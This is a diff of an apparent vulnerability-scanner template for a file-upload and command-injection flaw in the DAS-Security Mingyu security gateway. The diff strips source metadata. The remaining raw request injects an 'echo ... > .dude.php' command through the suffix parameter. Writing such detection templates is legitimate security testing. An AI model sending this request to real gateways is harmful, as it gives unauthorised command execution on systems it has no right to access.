@@ -3,12 +3,8 @@ info:
   name: 安恒明御安全网关存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rzv27uhw0a4ycpx2'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rzv27uhw0a4ycpx2
-    fofa: 暂无
 http:
 - raw:
   - 'GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.dude.php HTTP/1.1
